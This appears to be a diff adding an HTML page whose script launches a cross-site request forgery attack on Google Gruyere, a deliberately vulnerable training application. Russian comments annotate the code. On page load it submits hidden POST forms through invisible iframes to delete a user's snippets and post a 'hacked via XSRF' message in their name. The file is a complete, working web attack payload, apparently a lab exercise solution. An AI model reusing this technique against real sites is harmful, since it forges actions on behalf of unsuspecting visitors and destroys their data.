@@ -1,0 +1,60 @@
+<script>
+async function attack() {
+  const baseUrl = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
+
+  for (let index = 3; index >= 0; index--) {
+    const iframe = document.createElement('iframe');
+    iframe.name = 'target' + index;
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    const form = document.createElement('form');
+    form.method = 'POST';  // Важно: POST
+    form.action = `${baseUrl}/deletesnippet`;
+    form.target = iframe.name;
+    form.enctype = 'application/x-www-form-urlencoded';
+
+    // Добавляем uid и index как поля
+    ['uid', 'index'].forEach(name => {
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = name;
+      input.value = name === 'uid' ? '1111' : index;
+      form.appendChild(input);
+    });
+
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+
+    // Пауза, чтобы индексы успели обновиться
+    await new Promise(r => setTimeout(r, 600));
+  }
+
+  // Создать новый сниппет
+  setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.name = 'create';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = `${baseUrl}/newsnippet`;
+    form.target = 'create';
+    form.enctype = 'application/x-www-form-urlencoded';
+
+    const input = document.createElement('input');
+    input.type = 'hidden';
+    input.name = 'snippet';
+    input.value = '🔥 Хакнуто через XSRF | Алиса была здесь 😈';
+    form.appendChild(input);
+
+    document.body.appendChild(form);
+    form.submit();
+    document.body.removeChild(form);
+  }, 2000);
+}
+
+window.onload = attack;
+</script>
